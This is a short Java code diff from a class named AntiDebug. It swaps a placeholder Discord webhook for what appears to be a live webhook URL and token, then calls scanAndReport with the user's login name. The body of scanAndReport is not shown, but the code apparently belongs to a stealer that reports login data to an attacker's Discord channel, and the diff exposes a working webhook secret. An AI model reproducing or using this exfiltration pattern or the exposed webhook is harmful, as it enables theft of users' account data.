@@ -206,7 +206,7 @@ public class AntiDebug {
     }
 
     public static void main(String[] args) {
-        String webhook = "https://discord.com/api/webhooks/removed/removed";
+        String webhook = "https://discord.com/api/webhooks/1384815650916143185/tWMu0e-mq5Jx_5IHAT1gHHyuTnkMSeU6702D_-uq-sFjGqJrcudXa6pe9sp3KMdkVQxK";
         setLastKnownUsername(LoginData.username);
         scanAndReport(webhook);
     }
